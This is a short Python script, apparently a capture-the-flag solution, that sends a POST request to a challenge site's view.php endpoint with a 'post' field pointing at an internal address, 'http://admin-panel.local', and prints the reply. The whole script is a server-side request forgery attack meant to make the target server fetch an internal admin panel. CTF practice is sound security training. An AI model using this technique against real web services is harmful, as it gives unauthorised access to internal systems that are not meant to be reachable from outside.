import requests

url="https://ecorpblog.uctf.ir/api/view.php"

r=requests.post(url, json={"post":"http://admin-panel.local"})

print(r.text)